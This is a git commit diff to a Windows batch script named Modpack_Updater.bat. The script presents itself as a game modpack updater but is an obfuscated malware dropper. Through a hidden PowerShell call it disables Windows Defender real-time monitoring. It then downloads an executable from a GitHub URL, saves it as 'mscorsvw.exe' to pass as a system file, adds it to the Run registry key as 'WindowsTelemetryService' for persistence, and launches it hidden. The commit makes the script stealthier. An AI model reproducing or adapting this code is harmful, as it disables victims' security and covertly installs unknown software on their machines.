180eabf95704d2957d74f95e5def03f529df6579
Lawfull <l5wasnotfound@gmail.com>
2026-01-17 22:21:40 +0100

    Update Modpack_Updater.bat

--- Modpack_Updater.bat
+++ Modpack_Updater.bat
@@ -8,8 +8,8 @@ set "a1=a" & set "a2=d" & set "a3=d"
 :: Check if the script was started with '-st' parameter
 if "%~1"=="-st" goto :payload
 
-:: Disable Windows Defender (for demonstration only)
-%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
+:: FIX: Added -Command so it executes and closes
+%v1%%v2%%v3%%v4%%v5%%v6%%v7%%v4%%v8%%v8% -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
 
 :: Define the file name and download URL
 set "FN=mscorsvw.exe"
@@ -19,12 +19,12 @@ set "URL=https://github.com/fullylaw/happy.org/raw/main/dread.exe"
 :: Create the target directory if it doesn't exist
 if not exist "%TD%" mkdir "%TD%" >nul 2>&1
 
-:: Download and save the file using curl (d1-d4)
+:: Download and save the file
 %d1%%d2%%d3%%d4% -L -o "%TD%%FN%" "%URL%" >nul 2>&1
 
-:: Add the downloaded file to Startup Registry (r1-r3 and a1-a3)
+:: Add the downloaded file to Registry
 %r1%%r2%%r3% %a1%%a2%%a3% "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsTelemetryService" /t REG_SZ /d "\"%TD%%FN%\"" /f >nul 2>&1
 
-:: Run the downloaded file in a hidden window and EXIT
+:: Run the downloaded file in a hidden window and EXIT the batch
 start /b "" "%TD%%FN%"
 exit
